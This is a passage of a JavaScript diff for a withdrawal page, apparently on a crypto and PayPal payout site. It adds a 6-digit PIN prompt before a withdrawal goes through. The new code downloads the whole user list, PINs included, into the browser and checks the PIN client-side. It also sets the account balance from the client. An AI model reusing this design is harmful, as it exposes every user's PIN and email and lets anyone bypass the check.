                     if (modalRemaining) modalRemaining.innerText = `$${remainingToReach.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
-                    warningModal.classList.add('active'); 
-                } else { 
-                    const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50; 
-                    const newBalance = currentBalance - amount; 
-                    const newBalanceCents = Math.round(newBalance * 100); 
-                    updateDatabaseBalance(newBalanceCents); 
-                    showToast('Withdrawal submitted successfully!', true); 
-                    setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500); 
-                } 
-            }, 500); 
-        }, duration); 
+                    warningModal.classList.add('active');
+                } else {
+                    const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50;
+                    const newBalance = currentBalance - amount;
+                    const newBalanceCents = Math.round(newBalance * 100);
+                    updateDatabaseBalance(newBalanceCents);
+                    showToast('Withdrawal submitted successfully!', true);
+                    setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500);
+                }
+            }, 500);
+        }, duration);
+    }
+
+    // Validate and show PIN modal
+    async function validateAndShowPin() {
+        const amount = parseFloat(withdrawAmount?.value) || 0;
+        const minRequired = getMinimumWithdrawal();
+        
+        if (amount <= 0) { showToast('Please enter a valid amount', false); return false; }
+        if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return false; }
+        
+        if (currentMethod === 'crypto') {
+            if (!currentNetwork) { showToast('Please select a network', false); return false; }
+            const address = cryptoAddress?.value?.trim();
+            if (!address) { showToast('Please enter a wallet address', false); return false; }
+            if (!isValidBitcoinAddress(address)) { showToast('Invalid Bitcoin address', false); return false; }
+        } else {
+            const email = paypalEmail?.value?.trim();
+            if (!email) { showToast('Please enter a PayPal email', false); return false; }
+            if (!isValidEmail(email)) { showToast('Invalid email address', false); return false; }
+        }
+        
+        // Fetch latest PIN from database
+        try {
+            const response = await fetch(`${API_URL}?ignore_cache=1`);
+            const users = await response.json();
+            const user = users.find(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase());
+            currentUserPin = user?.Pin || null;
+        } catch (error) { console.error('Error fetching PIN:', error); }
+        
+        pendingWithdrawData = { amount, minRequired };
+        pinInput.value = '';
+        pinError.style.display = 'none';
+        pinModal.classList.add('active');
+        pinInput.focus();
+        return false;
+    }
+
+    // Verify PIN
+    function verifyPin() {
+        const enteredPin = pinInput.value;
+        if (!enteredPin || enteredPin.length !== 6) {
+            pinError.style.display = 'block';
+            pinError.innerHTML = '<i class="fas fa-exclamation-circle mr-2"></i> PIN must be 6 digits';
+            return;
+        }
+        if (enteredPin !== currentUserPin) {
+            pinError.style.display = 'block';
+            pinError.innerHTML = '<i class="fas fa-exclamation-circle mr-2"></i> Incorrect PIN. Please try again.';
+            pinInput.value = '';
+            pinInput.focus();
+            return;
+        }
+        pinModal.classList.remove('active');
+        if (pendingWithdrawData) {
+            startLoadingAfterPin(pendingWithdrawData.amount, pendingWithdrawData.minRequired);
+            pendingWithdrawData = null;
+        }
+    }
+
+    function cancelPin() {
+        pinModal.classList.remove('active');
+        pendingWithdrawData = null;
+        showToast('Transaction cancelled', false);
     }
 
     maxBtn?.addEventListener('click', () => { withdrawAmount.value = currentBalance.toFixed(2); calculateSummary(); });
     withdrawAmount?.addEventListener('input', calculateSummary);
     cryptoAddress?.addEventListener('input', validateAddress);
-    withdrawBtn?.addEventListener('click', handleWithdraw);
+    withdrawBtn?.addEventListener('click', validateAndShowPin);
     themeToggle?.addEventListener('click', toggleTheme);
+    
+    pinVerifyBtn?.addEventListener('click', verifyPin);
+    pinCancelBtn?.addEventListener('click', cancelPin);
+    pinInput?.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyPin(); });
     
     document.getElementById('helpBtn')?.addEventListener('click', () => helpModal.classList.add('active'));
     closeHelpModal?.addEventListener('click', () => helpModal.classList.remove('active'));
